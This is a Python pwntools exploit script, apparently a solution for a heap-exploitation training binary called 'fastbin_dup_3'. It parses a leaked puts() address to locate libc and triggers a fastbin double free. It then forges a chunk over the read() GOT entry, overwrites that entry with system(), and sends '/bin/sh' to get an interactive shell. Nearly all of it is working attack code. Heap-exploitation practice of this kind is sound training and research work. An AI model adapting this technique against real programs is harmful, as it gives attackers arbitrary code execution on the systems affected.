#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup_3")
libc = ELF(elf.runpath + b"/libc.so.6") # elf.libc broke again

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the "malloc" option; send size & data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b"1")
    io.sendafter(b"size: ", f"{size}".encode())
    io.sendafter(b"data: ", data)
    io.recvuntil(b"> ")
    index += 1
    return index - 1

# Select the "free" option; send index.
def free(index):
    io.send(b"2")
    io.sendafter(b"index: ", f"{index}".encode())
    io.recvuntil(b"> ")

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.recvuntil(b"> ")
io.timeout = 0.1

# =============================================================================

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b"A"*0x68)
chunk_B = malloc(0x68, b"B"*0x68)

# Free the 1st chunk, then the 2nd.
free(chunk_A)
free(chunk_B)
free(chunk_A)

fd = malloc(0x68, p64(elf.got["read"] - 3))
filler = malloc(0x68, b"filler")
filler2 = malloc(0x68, b"filler")

malloc(0x68, b"A" * 0xb + p64(libc.sym["system"]))

io.send("/bin/sh\x00")
# =============================================================================

io.interactive()
